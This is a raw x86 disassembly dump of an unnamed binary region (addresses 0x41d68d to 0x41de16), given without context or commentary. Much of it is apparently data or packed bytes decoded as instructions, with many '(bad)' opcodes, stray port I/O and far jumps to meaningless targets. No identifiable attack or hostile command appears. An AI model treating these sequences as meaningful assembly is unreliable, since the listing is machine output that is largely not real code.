  41d68d:	ins    DWORD PTR es:[edi],dx
  41d68e:	arpl   WORD PTR [ebp+0xd],bp
  41d691:	je     0x41d6f8
  41d693:	jae    0x41d700
  41d695:	jae    0x41d6c5
  41d697:	and    BYTE PTR [eax],ah
  41d699:	jne    0x41d70e
  41d69b:	das    
  41d69c:	outs   dx,DWORD PTR ds:[esi]
  41d69d:	gs jbe 0x41d719
  41d6a0:	outs   dx,DWORD PTR ds:[esi]
  41d6a1:	dec    esp
  41d6a2:	imul   BYTE PTR [ebx-0x74747420]
  41d6a8:	cmp    esp,DWORD PTR [ecx-0x75]
  41d6ab:	mov    esi,0x174ec30b
  41d6b0:	jmp    0xaa9896cd
  41d6b5:	dec    esp
  41d6b6:	shl    BYTE PTR [ecx],1
  41d6b8:	test   DWORD PTR [ecx-0x22008eb7],0x36624b4
  41d6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c3:	or     cl,al
  41d6c5:	mov    ecx,DWORD PTR [ebx-0x74678406]
  41d6cb:	mov    ecx,DWORD PTR [ebx+0x6a6a6a6a]
  41d6d1:	push   0x6a
  41d6d3:	push   0x6a
  41d6d5:	push   0xffffff8f
  41d6d7:	cdq    
  41d6d8:	add    BYTE PTR [eax],0x0
  41d6db:	add    BYTE PTR [eax],al
  41d6dd:	add    BYTE PTR [eax],al
  41d6df:	add    BYTE PTR [eax],al
  41d6e1:	add    ah,cl
  41d6e3:	int3   
  41d6e4:	or     BYTE PTR [eax*2-0x618c081d],dh
  41d6eb:	mov    ds:0x5c5deda8,al
  41d6f0:	add    al,0xeb
  41d6f2:	test   al,0x1d
  41d6f4:	imul   edi,ebp,0xffffffc3
  41d6f7:	shr    DWORD PTR [ebx],1
  41d6f9:	mov    ecx,0xccccf1fb
  41d6fe:	fistp  WORD PTR [eax-0x34]
  41d701:	int3   
  41d702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d703:	xor    cl,ah
  41d705:	int3   
  41d706:	and    al,0x24
  41d708:	jns    0x41d6f4
  41d70a:	add    ecx,DWORD PTR [eax+eax*2+0x1148f115]
  41d711:	into   
  41d712:	xchg   esi,eax
  41d713:	les    edx,FWORD PTR [edi-0x5d]
  41d716:	clc    
  41d717:	iret   
  41d718:	sub    DWORD PTR [eax-0x6e9c766e],edx
  41d71e:	int3   
  41d71f:	add    BYTE PTR [eax+0x67],ch
  41d722:	lea    ebp,[eax+0x0]
  41d725:	add    BYTE PTR [eax],al
  41d727:	imul   esp,DWORD PTR [ebx],0x4b
  41d72a:	pop    ds
  41d72b:	lods   eax,DWORD PTR ds:[esi]
  41d72c:	mov    ds:0x1f28b357,al
  41d731:	jp     0x41d78b
  41d733:	hlt    
  41d734:	inc    edx
  41d735:	mov    ds:0x243c2ffe,eax
  41d73a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d73b:	ss out 0xf3,al
  41d73e:	mov    eax,0x183253c3
  41d743:	mov    al,0xa8
  41d745:	add    al,0xf7
  41d747:	lods   al,BYTE PTR ds:[esi]
  41d749:	add    BYTE PTR cs:[eax],al
  41d74c:	scas   eax,DWORD PTR es:[edi]
  41d74d:	xchg   esi,eax
  41d74e:	add    BYTE PTR [eax],al
  41d750:	add    BYTE PTR [ebp+0x45],al
  41d753:	inc    ebp
  41d754:	inc    ebp
  41d755:	inc    ebp
  41d756:	inc    ebp
  41d757:	inc    ebp
  41d758:	inc    ebp
  41d759:	inc    ebp
  41d75a:	mov    edx,0xf1ad
  41d75f:	add    BYTE PTR [eax],al
  41d761:	add    BYTE PTR [eax],al
  41d763:	add    BYTE PTR [eax],al
  41d765:	add    BYTE PTR [ecx-0x3be89577],cl
  41d76b:	stc    
  41d76c:	gs jbe 0x41d70d
  41d76f:	xchg   edi,eax
  41d770:	and    DWORD PTR [edi+0x1793156f],edx
  41d776:	lock lds edx,FWORD PTR [edi+0x101c3ae4]
  41d77d:	out    0x56,al
  41d77f:	push   edx
  41d780:	mov    DWORD PTR [ecx+0x2cd3207e],ecx
  41d786:	(bad)  
  41d787:	sub    al,BYTE PTR [eax-0x24b46d]
  41d78d:	mov    esp,0x5457878e
  41d792:	mov    BYTE PTR [ebp-0x2927ebcf],cl
  41d798:	imul   ecx,eax,0xc3b0dc1
  41d79e:	imul   ecx,DWORD PTR [ecx+0x33106589],0xffffff89
  41d7a5:	mov    ebp,edi
  41d7a7:	push   esp
  41d7a8:	cwde   
  41d7a9:	mov    DWORD PTR [eax],eax
  41d7ab:	pop    ebp
  41d7ac:	fbstp  TBYTE PTR ds:0x99d8890d
  41d7b2:	sbb    eax,0x1c85e6b5
  41d7b7:	ins    BYTE PTR es:[edi],dx
  41d7b8:	pop    ebx
  41d7b9:	mov    edi,0x5b09673e
  41d7be:	dec    edi
  41d7bf:	sub    eax,DWORD PTR [ecx+ecx*8]
  41d7c2:	mov    ecx,0xe2000000
  41d7c7:	cmp    BYTE PTR [eax],al
  41d7c9:	add    ah,dl
  41d7cb:	mov    esp,0x0
	...
  41d7d8:	pop    es
  41d7d9:	or     cl,BYTE PTR gs:[eax+0x26]
  41d7dd:	inc    esp
  41d7de:	leave  
  41d7df:	xor    BYTE PTR [edi+0x69432444],ch
  41d7e5:	xor    eax,0x40d6037b
  41d7ea:	or     al,0x7f
  41d7ec:	aad    0xf6
  41d7ee:	sbb    al,0x55
  41d7f0:	(bad)  
  41d7f1:	(bad)  
  41d7f2:	(bad)  
  41d7f3:	(bad)  
  41d7f4:	(bad)  
  41d7f5:	(bad)  
  41d7f6:	(bad)  
  41d7f7:	(bad)  
  41d7f8:	dec    esp
  41d7fa:	int3   
  41d7fb:	sbb    BYTE PTR ds:0xcccc9084,bh
  41d801:	add    eax,0xa9ad8329
  41d806:	xchg   bp,sp
  41d809:	dec    esi
  41d80a:	jmp    0x41d7d2
  41d80c:	cdq    
  41d80d:	(bad)  
  41d80e:	adc    DWORD PTR [esi+0x69f40192],eax
  41d814:	mov    DWORD PTR [eax+esi*4+0x631710cd],edi
  41d81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d81c:	mov    ebx,DWORD PTR [eax-0x4958aa21]
  41d822:	mov    DWORD PTR [esp+ecx*8-0x33387d34],ebp
  41d829:	int3   
  41d82a:	outs   dx,BYTE PTR ds:[esi]
  41d82b:	popa   
  41d82c:	jmp    0x41d7fa
  41d82e:	lea    edi,[ebx-0x45f755fc]
  41d834:	mov    al,0xcf
  41d836:	ficomp DWORD PTR [ecx-0x47]
  41d839:	jecxz  0x41d856
  41d83b:	cvtps2pd xmm5,QWORD PTR [edx]
  41d83e:	fucomp st(4)
  41d840:	sbb    ch,BYTE PTR gs:[esi+ebx*8-0x22]
  41d845:	shr    DWORD PTR [esi-0x7d727273],cl
  41d84b:	inc    ecx
  41d84c:	sbb    al,0x21
  41d84e:	sar    DWORD PTR [esi],cl
  41d850:	dec    ebx
  41d851:	mov    ds:0x4509b0a2,al
  41d856:	clc    
  41d857:	(bad)  
  41d858:	dec    edi
  41d859:	mov    bl,BYTE PTR [ebx+0x5f2a8631]
  41d85f:	dec    edi
  41d860:	adc    DWORD PTR [ebx+0x64],ebx
  41d863:	std    
  41d864:	mov    ebx,0x8d8d92c2
  41d869:	es jmp 0x0:0x8d8d8d0f
  41d871:	add    BYTE PTR [eax],al
  41d873:	add    BYTE PTR [eax],al
  41d875:	add    BYTE PTR [eax],al
  41d877:	add    BYTE PTR [edx+0x73d7],ch
  41d87d:	add    BYTE PTR [eax],al
  41d87f:	add    BYTE PTR [eax],al
  41d881:	add    BYTE PTR [eax],al
  41d883:	add    BYTE PTR [esp+eax*1],al
  41d886:	pop    esp
  41d887:	add    cl,BYTE PTR [edx+0x2e]
  41d88a:	or     eax,0x202b4da6
  41d88f:	aaa    
  41d890:	ss (bad) 
  41d892:	aad    0xf9
  41d894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d895:	fsub   DWORD PTR [edx]
  41d897:	(bad)  
  41d898:	xor    dh,BYTE PTR [edx+0x7e09809e]
  41d89e:	add    al,0x4
  41d8a0:	ins    BYTE PTR es:[edi],dx
  41d8a1:	clc    
  41d8a2:	add    al,0x4
  41d8a4:	jle    0x41d871
  41d8a6:	add    al,0x4
  41d8a8:	ret    
  41d8a9:	lods   al,BYTE PTR ds:[esi]
  41d8aa:	mov    ah,0xe7
  41d8ac:	neg    edx
  41d8ae:	xor    BYTE PTR [edx+0x3d37b1d7],0x28
  41d8b5:	mov    esp,0xaa81ed07
  41d8ba:	push   ss
  41d8bb:	stos   DWORD PTR es:[edi],eax
  41d8bc:	mov    edx,0x476be7c
  41d8c1:	add    bh,ch
  41d8c3:	in     eax,dx
  41d8c4:	fiadd  WORD PTR [edi+0x17000000]
  41d8ca:	(bad)  
  41d8cb:	outs   dx,DWORD PTR ds:[esi]
  41d8cc:	in     al,0xcd
  41d8ce:	mov    eax,0x8def425e
  41d8d3:	stc    
  41d8d4:	or     al,0x82
  41d8d6:	mov    edi,0x9756dbb4
  41d8db:	sbb    al,0x68
  41d8dd:	sbb    al,0xb
  41d8df:	mov    esp,0xf88d825f
  41d8e4:	ss fs jmp 0x86:0xd83de45d
  41d8ed:	add    ch,dh
  41d8ef:	rol    BYTE PTR [eax],cl
  41d8f1:	add    BYTE PTR [eax],al
  41d8f3:	call   0xe92ac1e0
  41d8f8:	call   0x412ac1e5
  41d8fd:	std    
  41d8fe:	(bad)  
  41d8ff:	jne    0x41d976
  41d901:	jne    0x41d978
  41d903:	jne    0x41d97a
  41d905:	jne    0x41d97c
  41d907:	jne    0x41d909
  41d909:	add    ah,dl
  41d90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d90c:	xor    al,0x63
  41d90e:	mov    bh,0x50
  41d910:	out    0xd9,eax
  41d912:	hlt    
  41d913:	call   0xd933f74b
  41d918:	push   eax
  41d919:	pop    ecx
  41d91a:	cmp    al,0x98
  41d91c:	les    ecx,FWORD PTR [edx]
  41d91e:	sub    eax,DWORD PTR [ebx]
  41d920:	and    dl,BYTE PTR [eax+eax*1]
  41d923:	add    BYTE PTR [edx],ch
  41d925:	lea    ebp,[ebx+0x279c46d9]
  41d92b:	jle    0x41d8fe
  41d92d:	outs   dx,BYTE PTR ds:[esi]
  41d92e:	xor    dh,BYTE PTR [eax-0x3e]
  41d931:	mov    dh,0x1e
  41d933:	inc    esp
  41d934:	scas   al,BYTE PTR es:[edi]
  41d935:	jecxz  0x41d99c
  41d937:	pop    ds
  41d938:	dec    ecx
  41d939:	in     eax,dx
  41d93a:	sar    ecx,1
  41d93c:	ret    
  41d93d:	jg     0x41d96d
  41d93f:	cmp    BYTE PTR [ecx],bh
  41d941:	add    BYTE PTR [eax],al
  41d943:	and    eax,0x8b1a
  41d948:	popa   
  41d949:	sbb    al,0xcb
  41d94b:	add    BYTE PTR [ebx+0x53b81cd4],cl
  41d951:	push   0xa8b5a1ca
  41d956:	aam    0x68
  41d958:	imul   eax,edi,0xffffffc3
  41d95b:	adc    DWORD PTR [ebx+0x21],ecx
  41d95e:	fld    DWORD PTR [eax]
  41d960:	scas   eax,DWORD PTR es:[edi]
  41d961:	mov    esp,0x8b5bb0d7
  41d966:	mov    ecx,DWORD PTR [ebx-0x74748a9c]
  41d96c:	cmp    al,0xef
  41d96e:	mov    ecx,DWORD PTR [ebx+0x8b]
  41d974:	add    BYTE PTR [eax],al
  41d976:	add    BYTE PTR [eax],al
  41d978:	add    BYTE PTR [eax],al
  41d97a:	mov    eax,0xf9704b32
  41d97f:	lds    ebp,FWORD PTR [esi+0x4d0085c4]
  41d985:	mov    dl,0x62
  41d987:	push   edx
  41d988:	fidiv  DWORD PTR [ecx+0x3]
  41d98b:	out    0xd4,al
  41d98d:	(bad)  
  41d98e:	je     0x41d9ce
  41d990:	mov    cl,0x80
	...
  41d99a:	add    BYTE PTR [ebx+0x108b8d8b],cl
  41d9a0:	enter  0x8b8b,0xbf
  41d9a4:	add    esi,edi
  41d9a6:	nop
  41d9a7:	jnp    0x41d9e6
  41d9a9:	jne    0x41d96a
  41d9ab:	jno    0x41d9de
  41d9ad:	sbb    al,0x62
  41d9af:	xchg   BYTE PTR [ebp-0x36e175ed],al
  41d9b5:	loopne 0x41d948
  41d9b7:	icebp  
  41d9b8:	mov    bl,0xaa
  41d9ba:	jmp    0x77483ace
  41d9bf:	mov    ?,edx
  41d9c1:	pop    ecx
  41d9c2:	stc    
  41d9c3:	lea    edi,[edx-0x6d747483]
  41d9c9:	jnp    0x5f4a535a
  41d9cf:	mov    eax,DWORD PTR [eax]
  41d9d1:	xor    BYTE PTR ds:0xbf070809,cl
  41d9d7:	cmp    BYTE PTR [edi+edi*2],bh
  41d9da:	in     al,dx
  41d9db:	pop    esi
  41d9dc:	pushf  
  41d9dd:	stos   DWORD PTR es:[edi],eax
  41d9de:	sub    DWORD PTR [ebx-0x10cb91d2],0x55dd21c6
  41d9e8:	rol    DWORD PTR [eax],1
  41d9ea:	add    BYTE PTR [eax],al
  41d9ec:	retf   0x6c3e
  41d9ef:	dec    ebp
  41d9f0:	aas    
  41d9f1:	xor    bh,BYTE PTR [ecx-0x1c]
  41d9f4:	xor    BYTE PTR [ecx],bh
  41d9f6:	aad    0x64
  41d9f8:	pop    ebp
  41d9f9:	dec    edi
  41d9fa:	sbb    ecx,ecx
  41d9fc:	retf   
  41d9fd:	or     eax,0x34a38575
  41da02:	inc    edi
  41da03:	mov    edx,0x97cc28af
  41da08:	inc    esi
  41da09:	add    BYTE PTR [eax],al
  41da0b:	adc    bl,BYTE PTR [ebx+0x93]
  41da11:	call   0xe92ac2fe
  41da16:	call   0x812ac303
  41da1b:	mov    bh,ch
  41da1d:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41da23:	mov    ecx,DWORD PTR [ebx-0x4b8b8b75]
  41da29:	les    edi,FWORD PTR [esi+ebx*8]
  41da2c:	out    dx,eax
  41da2d:	int    0xce
  41da2f:	mov    gs,WORD PTR [edi+ecx*1]
  41da32:	loope  0x41d9b8
  41da34:	mov    ebp,0x75436676
  41da39:	jbe    0x41daa3
  41da3b:	cs jb  0x41daa3
  41da3e:	ins    DWORD PTR es:[edi],dx
  41da3f:	and    BYTE PTR [eax],ah
  41da41:	imul   esi,DWORD PTR [ebp+0x67],0x736e6520
  41da48:	inc    ecx
  41da49:	and    BYTE PTR [edx+0x7a],dh
  41da4c:	ins    DWORD PTR es:[edi],dx
  41da4d:	popa   
  41da4e:	ins    DWORD PTR es:[edi],dx
  41da4f:	imul   edx,DWORD PTR [ebx+0x77],0x650d206c
  41da56:	jo     0x41dac8
  41da58:	je     0x41dac9
  41da5a:	jbe    0x41da7c
  41da5c:	push   edi
  41da5d:	arpl   WORD PTR ds:0x723c6f3e,cx
  41da63:	ins    DWORD PTR es:[edi],dx
  41da64:	outs   dx,DWORD PTR ds:[esi]
  41da65:	and    dh,BYTE PTR [edx+eiz*2+0xa]
  41da69:	cmp    al,0x45
  41da6b:	cmp    al,0x75
  41da6d:	gs ins BYTE PTR es:[edi],dx
  41da6f:	jo     0x41dae4
  41da71:	ja     0x41dae5
  41da73:	imul   esp,DWORD PTR [eax],0x65446d65
  41da79:	outs   dx,BYTE PTR ds:[esi]
  41da7a:	js     0x41daef
  41da7c:	gs cmp eax,0x63206574
  41da82:	cmp    al,0x29
  41da84:	ins    DWORD PTR es:[edi],dx
  41da85:	and    BYTE PTR [esi+0x6e],ah
  41da88:	or     dh,BYTE PTR [edx+0x77]
  41da8b:	and    BYTE PTR [ebp+0x73],ch
  41da8e:	imul   ebp,DWORD PTR [ecx+0x6c],0x3ac0ee07
  41da95:	test   DWORD PTR gs:[ecx+ebx*1],esi
  41da99:	mov    ds:0x577474dd,al
  41da9e:	fs je  0x41db15
  41daa1:	jo     0x41da60
  41daa3:	je     0x41db19
  41daa5:	in     al,0x9d
  41daa7:	fcomp  DWORD PTR [esi+eax*1+0x7086635a]
  41daae:	lods   al,BYTE PTR ds:[esi]
  41daaf:	jmp    0x392e:0xd5a8fff9
  41dab6:	dec    eax
  41dab7:	jno    0x41da69
  41dab9:	or     BYTE PTR [edi],al
  41dabb:	inc    esi
  41dabc:	aad    0x74
  41dabe:	add    cl,ah
  41dac0:	js     0x41da9d
  41dac2:	mov    dh,0x0
  41dac4:	add    BYTE PTR [eax],al
  41dac6:	in     al,0xf2
  41dac8:	mov    ebp,0xc2a9906e
  41dacd:	popf   
  41dace:	add    BYTE PTR [eax+0x59],dh
  41dad1:	add    BYTE PTR [esi-0x28],cl
  41dad4:	repz adc bh,dl
  41dad7:	jns    0x41da68
  41dad9:	or     esi,ebp
  41dadb:	(bad)  
  41dadc:	je     0x41db2b
  41dade:	call   0x2e:0x6ef7d354
  41dae5:	sar    DWORD PTR [eax+0x27],0xc9
  41dae9:	add    BYTE PTR [eax],al
  41daeb:	out    dx,al
  41daec:	arpl   WORD PTR [eax],ax
	...
  41daf6:	add    BYTE PTR [eax],al
  41daf8:	add    BYTE PTR [edx-0x71],ah
  41dafb:	hlt    
  41dafc:	int3   
  41dafd:	int3   
  41dafe:	int3   
  41daff:	int3   
  41db00:	int3   
  41db01:	int3   
  41db02:	int3   
  41db03:	int3   
  41db04:	int3   
  41db05:	add    BYTE PTR [eax],al
  41db07:	ja     0x41db57
  41db09:	inc    esi
  41db0a:	sbb    ebx,edx
  41db0c:	adc    esi,ecx
  41db0e:	dec    eax
  41db0f:	aas    
  41db10:	inc    esi
  41db11:	sbb    ecx,DWORD PTR [ecx]
  41db13:	cmp    al,0x2
  41db15:	ss inc eax
  41db17:	leave  
  41db18:	loopne 0x41da9a
  41db1a:	loope  0x41db02
  41db1c:	and    DWORD PTR [ecx+0x2500001f],0x20203955
  41db26:	lock sub ecx,DWORD PTR [edx-0x9]
  41db2a:	and    DWORD PTR [eax-0x1a],0xffffffda
  41db2e:	dec    edx
  41db2f:	js     0x41daca
  41db31:	cmp    BYTE PTR [ecx+ecx*8-0x14],0x20
  41db36:	lds    edx,FWORD PTR [esi-0x5093377]
  41db3c:	enter  0x1d,0x0
  41db40:	jmp    FWORD PTR [edi-0x23ffff90]
  41db46:	mov    edx,edi
  41db48:	add    bh,bh
  41db4a:	clc    
  41db4b:	cmp    ebp,ebp
  41db4d:	int3   
  41db4e:	fistp  DWORD PTR [ecx*8+0x796edc09]
  41db55:	ja     0x41db7a
  41db57:	inc    ecx
  41db58:	test   al,0x1a
  41db5a:	jp     0x41db6f
  41db5c:	fstp   TBYTE PTR [ecx+0x7a]
  41db5f:	addr16 cmp dh,dh
  41db62:	(bad)  
  41db63:	(bad)  
  41db64:	dec    DWORD PTR [eax-0x6e000002]
  41db6a:	loope  0x41db6b
  41db6c:	(bad)  
  41db6d:	inc    DWORD PTR [eax]
	...
  41db77:	test   DWORD PTR [ecx-0x2c],eax
  41db7a:	sbb    dl,BYTE PTR [edi-0x49c81edd]
  41db80:	add    DWORD PTR [ecx-0x2ec8f18e],0x6d
  41db87:	imul   eax,DWORD PTR [esi],0xc45f9310
  41db8d:	jge    0x41db82
	...
  41db97:	add    al,ch
  41db99:	call   0x7eeb3506
  41db9e:	call   0xaf5be18b
  41dba3:	push   ds
  41dba4:	lea    ebx,[edx]
  41dba6:	mov    bh,0xdf
  41dba8:	push   edi
  41dba9:	push   ds
  41dbaa:	xchg   DWORD PTR [esi+0xd086c0c],edi
  41dbb0:	loop   0x41dc01
  41dbb2:	imul   esp,ecx,0xf52bf30a
  41dbb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbb9:	xor    eax,0x124ef8d9
  41dbbe:	dec    ebx
  41dbbf:	mov    edx,0xe8cd5bf3
  41dbc4:	call   0xe92a94c7
  41dbc9:	jg     0x41dc3a
  41dbcb:	mov    ds:0x98f104e8,eax
  41dbd0:	loop   0x41dc4f
  41dbd2:	mov    ds:0xafd1d56d,eax
  41dbd7:	je     0x41dc1b
  41dbd9:	jmp    0x41dbd9
  41dbdb:	gs sbb al,0x49
  41dbde:	pusha  
  41dbdf:	lahf   
  41dbe0:	mov    ds:0x5cd22c01,al
  41dbe5:	stos   BYTE PTR es:[edi],al
  41dbe6:	add    al,0x4
  41dbe8:	add    al,0xab
  41dbea:	addr16 out 0x42,eax
  41dbed:	js     0x41db73
  41dbef:	jle    0x41dbc3
  41dbf1:	mov    DWORD PTR [edx+0x31bafc8],esp
  41dbf7:	cmp    al,0xaa
  41dbf9:	pusha  
  41dbfa:	xlat   BYTE PTR ds:[ebx]
  41dbfb:	stos   BYTE PTR es:[edi],al
  41dbfc:	js     0x41dc1c
  41dbfe:	xchg   ecx,eax
  41dbff:	mov    ebx,0x3417ff48
  41dc04:	(bad)  
  41dc05:	sbb    DWORD PTR [esp+eax*1],eax
  41dc08:	dec    esi
  41dc09:	pop    ds
  41dc0a:	and    eax,0x24040404
  41dc0f:	and    al,0x24
  41dc11:	and    al,0x24
  41dc13:	and    al,0x24
  41dc15:	and    al,0x24
  41dc17:	in     eax,dx
  41dc18:	dec    ebx
  41dc19:	loope  0x41dc1a
  41dc1b:	(bad)  
  41dc1c:	(bad)  
  41dc1d:	(bad)  
  41dc1e:	(bad)  
  41dc1f:	(bad)  
  41dc20:	(bad)  
  41dc21:	(bad)  
  41dc22:	inc    DWORD PTR [eax]
  41dc24:	add    BYTE PTR ds:0xb513b046,ah
  41dc2a:	cwde   
  41dc2b:	xchg   edi,eax
  41dc2c:	in     al,0xce
  41dc2e:	lods   eax,DWORD PTR ds:[esi]
  41dc2f:	pop    eax
  41dc30:	mov    edx,0x3ac82261
  41dc35:	xor    DWORD PTR [ebp+0x19267156],ebx
  41dc3b:	inc    eax
  41dc3c:	call   0x0:0xadcd0000
  41dc43:	ins    DWORD PTR es:[edi],dx
  41dc44:	test   DWORD PTR [eax],eax
  41dc46:	add    BYTE PTR [ebp-0x34],bh
  41dc49:	jmp    0x9aec:0xbac11570
  41dc50:	xchg   ecx,eax
  41dc51:	cmp    BYTE PTR [ecx+0x157d50dc],0x98
  41dc58:	cmc    
  41dc59:	dec    esi
  41dc5a:	(bad)  
  41dc5b:	jae    0x41dc1e
  41dc5d:	xor    edi,DWORD PTR [ecx+0x0]
  41dc60:	mov    DWORD PTR [ebx-0x761de4ca],esi
  41dc66:	mov    DWORD PTR [ecx-0xd17abc6],ecx
  41dc6c:	xchg   esi,eax
  41dc6d:	sti    
  41dc6e:	jbe    0x41dc04
  41dc70:	retf   
  41dc71:	in     eax,0xd9
  41dc73:	(bad)  
  41dc74:	push   esp
  41dc75:	(bad)  
  41dc76:	in     eax,0xb
  41dc78:	push   0x3f
  41dc7a:	sti    
  41dc7b:	mov    ds:0x58f535d1,eax
  41dc80:	or     eax,0xcf62712e
  41dc85:	dec    edi
  41dc86:	les    ebx,FWORD PTR [ebp-0x5e]
  41dc89:	mov    edi,0xe3898961
  41dc8e:	jno    0x41dc19
  41dc90:	mov    DWORD PTR [ecx+0x0],ecx
  41dc96:	add    BYTE PTR [eax],al
  41dc98:	add    BYTE PTR [eax],al
  41dc9a:	add    BYTE PTR [ebp+0xe11d],dl
  41dca0:	add    BYTE PTR [eax],al
  41dca2:	add    BYTE PTR [eax],al
  41dca4:	add    BYTE PTR [eax],al
  41dca6:	add    BYTE PTR [ebp+0x75],dh
  41dca9:	adc    cl,bh
  41dcab:	cdq    
  41dcac:	popf   
  41dcad:	mov    bl,0x6
  41dcaf:	cld    
  41dcb0:	push   edi
  41dcb1:	jbe    0x41dc98
  41dcb3:	push   ecx
  41dcb4:	(bad)  
  41dcb5:	jnp    0x41dcad
  41dcb7:	(bad)  
  41dcb8:	push   ebp
  41dcb9:	mov    WORD PTR [ebx],?
  41dcbb:	outs   dx,DWORD PTR ds:[esi]
  41dcbc:	xchg   ecx,eax
  41dcbd:	and    BYTE PTR [edx+0x75750539],bl
  41dcc3:	mov    esp,0xb8219337
  41dcc8:	sub    ebx,DWORD PTR [ecx]
  41dcca:	fstp   QWORD PTR [edi-0x18252471]
  41dcd0:	sub    al,0xc7
  41dcd2:	(bad)  
  41dcd3:	leave  
  41dcd4:	adc    BYTE PTR [ecx+0x1a],cl
  41dcd7:	jp     0x41dcd0
  41dcd9:	mov    bl,0x3f
  41dcdb:	outs   dx,BYTE PTR ds:[esi]
  41dcdc:	xor    dh,BYTE PTR [esi+0x2]
  41dcdf:	shl    DWORD PTR [ebp+0x75],cl
  41dce2:	mov    ds:0x7575a677,eax
  41dce7:	(bad)  
  41dce8:	shr    BYTE PTR [ecx],1
  41dcea:	jne    0x41dcec
  41dcec:	xor    eax,0x895fb3a7
  41dcf1:	or     BYTE PTR [ebp-0x74],0xe6
  41dcf5:	inc    esi
  41dcf6:	popf   
  41dcf7:	dec    edi
  41dcf8:	jo     0x41dc9a
  41dcfa:	imul   eax,edx,0xffffffa9
  41dcfd:	or     eax,0xea9455d0
  41dd02:	push   esp
  41dd03:	enter  0x0,0x0
  41dd07:	xchg   ebx,eax
  41dd09:	add    BYTE PTR [eax],al
  41dd0b:	(bad)  
  41dd0c:	jns    0x41dd0e
	...
  41dd16:	add    BYTE PTR [eax],al
  41dd18:	add    BYTE PTR [ebx+0x6fbd171c],dl
  41dd1e:	icebp  
  41dd1f:	pop    ds
  41dd20:	and    DWORD PTR ds:[ecx-0x24],esi
  41dd24:	push   esi
  41dd25:	sub    DWORD PTR [eax],esi
  41dd27:	add    eax,0xd481ce38
  41dd2c:	xor    eax,0xfea039d0
  41dd31:	add    BYTE PTR [eax],al
  41dd33:	add    BYTE PTR [eax],al
  41dd35:	add    BYTE PTR [ebx+0x6d],ah
  41dd38:	cs gs outs dx,DWORD PTR ds:[esi]
  41dd3c:	sub    al,0x63
  41dd3e:	popa   
  41dd3f:	jae    0x41ddb3
  41dd41:	ins    DWORD PTR es:[edi],dx
  41dd42:	jo     0x41ddb9
  41dd44:	or     eax,0x4765652e
  41dd49:	push   0x726d706e
  41dd4e:	push   eax
  41dd4f:	and    BYTE PTR [edx+0x62],dh
  41dd52:	jb     0x41ddc3
  41dd54:	je     0x41dd76
  41dd56:	jae    0x41ddbd
  41dd58:	bound  esp,QWORD PTR [edi+0x74]
  41dd5b:	sub    BYTE PTR [edx+0x6e],dh
  41dd5e:	gs gs push ebx
  41dd61:	ins    BYTE PTR es:[edi],dx
  41dd62:	push   edi
  41dd63:	gs imul esp,DWORD PTR cs:[ebp+0x6d],0x6f696365
  41dd6c:	jns    0x41ddd0
  41dd6e:	pop    ebp
  41dd6f:	outs   dx,BYTE PTR ds:[esi]
  41dd70:	arpl   WORD PTR [ebx+0x2e],dx
  41dd73:	dec    ebp
  41dd74:	ins    DWORD PTR es:[edi],dx
  41dd75:	outs   dx,BYTE PTR ds:[esi]
  41dd76:	sub    al,0x6f
  41dd78:	and    BYTE PTR [ebp+0x20],ah
  41dd7b:	jb     0x41dd9d
  41dd7d:	sub    DWORD PTR ds:0x63746565,edi
  41dd83:	outs   dx,BYTE PTR ds:[esi]
  41dd84:	or     dh,BYTE PTR [ebx+0x6d]
  41dd87:	and    BYTE PTR [ecx+eiz*2+0x74],ch
  41dd8b:	gs inc ebx
  41dd8d:	sub    DWORD PTR gs:[esi+0xa],esp
  41dd91:	fs js  0x41ddd2
  41dd94:	and    BYTE PTR [edx+esi*2+0x56],ch
  41dd98:	cs ins BYTE PTR es:[edi],dx
  41dd9a:	gs jbe 0x41de0f
  41dd9d:	ins    BYTE PTR es:[edi],dx
  41dd9e:	and    BYTE PTR [edi+0x2e],dl
  41dda1:	push   0x6578533e
  41dda6:	ins    DWORD PTR es:[edi],dx
  41dda7:	add    BYTE PTR [eax],al
  41dda9:	add    BYTE PTR [eax],al
  41ddab:	add    BYTE PTR [eax],al
  41ddad:	dec    ecx
  41ddae:	ins    DWORD PTR es:[edi],dx
  41ddaf:	scas   al,BYTE PTR es:[edi]
  41ddb0:	inc    ebp
  41ddb1:	add    BYTE PTR [eax],al
  41ddb3:	sbb    edx,DWORD PTR [esi]
  41ddb5:	or     edi,DWORD PTR [eax]
  41ddb7:	dec    edi
  41ddb8:	ss int 0x7
  41ddbb:	xchg   ebp,eax
  41ddbc:	clc    
  41ddbd:	test   ecx,ecx
  41ddbf:	int    0x41
  41ddc1:	loop   0x41dd75
  41ddc3:	je     0x41dd8b
  41ddc5:	mov    ss,WORD PTR [edi-0x6b]
  41ddc8:	lea    ebx,[ebx]
  41ddca:	jns    0x41de17
  41ddcc:	jns    0x41dde9
  41ddce:	ss out dx,eax
  41ddd0:	pop    ebp
  41ddd1:	push   esp
  41ddd2:	push   edi
  41ddd3:	cld    
  41ddd4:	pop    ebp
  41ddd5:	mov    ds:0xc8240000,eax
  41ddda:	add    BYTE PTR [eax],al
  41dddc:	or     al,0x71
  41ddde:	mov    eax,ds:0x59128b00
  41dde3:	scas   eax,DWORD PTR es:[edi]
  41dde4:	jg     0x41dda2
  41dde6:	jnp    0x41dd7e
  41dde8:	aaa    
  41dde9:	jmp    0x41de4b
  41ddeb:	or     dl,bl
  41dded:	xor    BYTE PTR [ebx],al
  41ddef:	cmc    
  41ddf0:	push   edx
  41ddf1:	(bad)  
  41ddf2:	cmp    al,0xe2
  41ddf4:	das    
  41ddf5:	push   ebp
  41ddf6:	dec    ecx
  41ddf7:	dec    edi
  41ddf8:	dec    esi
  41ddf9:	mov    ecx,DWORD PTR [ebx-0x6b19aa75]
  41ddff:	push   esi
  41de00:	mov    ecx,0xee5a3485
  41de05:	pop    esi
  41de06:	repz mov ah,0x3e
  41de09:	mov    ah,0xce
  41de0b:	push   esi
  41de0c:	scas   eax,DWORD PTR es:[edi]
  41de0d:	add    BYTE PTR [ebp-0x4072dc40],cl
  41de13:	add    al,0x9
  41de15:	clc    
  41de16:	cmp    BYTE PTR [esi],0xfe
